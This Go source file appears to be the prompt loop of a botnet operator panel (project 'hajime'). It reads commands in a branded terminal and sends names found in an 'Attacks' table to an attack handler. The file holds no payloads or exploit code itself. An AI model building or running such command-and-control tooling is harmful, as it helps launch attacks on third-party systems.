package views

import (
	"hajime/source"
	"hajime/source/masters/commands"
	"hajime/source/masters/sessions"
	"io"
	"log"
	"strings"

	"golang.org/x/term"
)

// PromptPage will handles the authenticated connection
func PromptPage(session *sessions.Session) error {
	if err := session.ExecuteBranding(make(map[string]any), "resources", "branding", "home_splash.tfx"); err != nil {
		return err
	}

	prompt, err := session.ExecuteBrandingToString(make(map[string]any), "resources", "branding", "prompt.tfx")
	if err != nil {
		return err
	}

	t := term.NewTerminal(session.Term, prompt)

	for {
		command, err := t.ReadLine()
		if err != nil {
			return err
		}

		args := strings.Split(command, " ")
		if len(args) == 0 || args[0] == "" {
			continue
		}
	
		/* attempts to find the command */
		cmd := commands.GetCommand(args...)
		if cmd == nil {
			method, ok := source.Attacks[args[0]]
			if ok && method != nil {
				err := AttackPage(session, args, method)
				if err == nil {
					continue
				}

				if err := session.ExecuteBranding(make(map[string]any), "resources", "branding", "command_error.tfx"); err != nil {
					return err
				}
	
				log.Println("views/PromptPage", err)
				continue
			}

			err := session.ExecuteBranding(make(map[string]any), "resources", "branding", "command_not_found.tfx")
			if err != nil {
				return err
			}

			continue
		}
		
		/* checks if the session can access the command */
		if !cmd.HasPermissions(session) {
			err := session.ExecuteBranding(make(map[string]any), "resources", "branding", "command_unauthorized.tfx")
			if err != nil {
				return err
			}

			continue
		}

		/* Executes the command body itself*/
		if err := cmd.Execute(session, args); err != nil {
			if err == io.EOF {
				return err
			}

			/* prints the error branding */
			if err := session.ExecuteBranding(make(map[string]any), "resources", "branding", "command_error.tfx"); err != nil {
				return err
			}

			log.Println("views/PromptPage", err)
			continue
		}
	}
}